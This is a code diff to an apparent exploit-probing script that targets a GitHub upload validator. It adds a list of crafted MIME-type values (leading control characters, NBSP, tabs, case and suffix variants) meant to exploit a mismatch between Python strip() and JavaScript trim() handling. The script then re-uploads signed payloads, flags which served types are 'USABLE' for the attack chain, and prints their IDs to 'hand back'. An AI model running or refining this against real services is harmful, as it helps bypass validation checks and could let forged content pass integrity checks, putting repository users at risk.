@@ -124,10 +124,22 @@ function usable(ct) {
   // why the replay hash did not match the fingerprint).
   //   text/plain       -> Node skips validation, so sourceSha256 = sha256(our bytes)
   //   application/json -> Python accepts the type on the direct origin re-check
+  // Everything we APPENDED to the mime type was rejected by GitHub's validator, so probe the
+  // other side (leading separators) and the validator's boundaries. A value whose Python .strip()
+  // yields "application/json" while JS .trim() does not closes the chain: Python accepts the type
+  // on both the replay and the direct origin re-check, while Node skips the repositoryName test.
   const wanted = [
-    { version: 7, mime: 'text/plain', tag: 'plain' },
-    { version: 7, mime: 'application/json', tag: 'json' },
-  ].map((v) => ({ ...v, name: `${v.tag}-${stamp}` }));
+    ['lead-NEL', '\u0085application/json'],
+    ['lead-FS', '\u001capplication/json'],
+    ['lead-space', ' application/json'],
+    ['lead-tab', '\tapplication/json'],
+    ['lead-NBSP', '\u00a0application/json'],
+    ['trail-NBSP', 'application/json\u00a0'],
+    ['trail-tab', 'application/json\t'],
+    ['upper', 'APPLICATION/JSON'],
+    ['dot', 'application/json.'],
+    ['plus', 'application/json+json'],
+  ].map(([tag, mime]) => ({ version: 7, mime, tag, name: `${tag}-${stamp}` }));
 
   const out = [];
   for (const v of wanted) {
@@ -157,13 +169,16 @@ function usable(ct) {
     const payload = build(id);
     const put2 = await putBlob(signed, payload, v.mime);
     const got = await inspect(id);
-    console.log(`[*] ${v.tag} id=${id} rePUT=${put2.status} served=${JSON.stringify(got.served)}`
-      + ` bodyMatches=${got.body ? got.body.equals(payload) : false}`);
+    const ok = usable(got.served);
+    console.log(`[*] ${v.tag} mime=${JSON.stringify(v.mime)} id=${id} rePUT=${put2.status}`
+      + ` served=${JSON.stringify(got.served)} hex=${Buffer.from(got.served || '', 'latin1').toString('hex')}`
+      + ` bodyMatches=${got.body ? got.body.equals(payload) : false}${ok ? '  <-- USABLE' : ''}`);
     out.push({ ...v, id, served: got.served, body: got.body, payload });
   }
 
   console.log('\n===== HAND THIS BACK =====');
-  for (const r of out) {
+  console.log('USABLE_FOUND=' + out.some((r) => usable(r.served)));
+  for (const r of out.filter((x) => usable(x.served)).concat(out.slice(0, 1))) {
     console.log(`${r.tag.toUpperCase()}_ID=${r.id}`);
     console.log(`${r.tag.toUpperCase()}_CT=${JSON.stringify(r.served)}`);
     console.log(`${r.tag.toUpperCase()}_BODY_OK=${r.body ? r.body.equals(r.payload) : false}`);
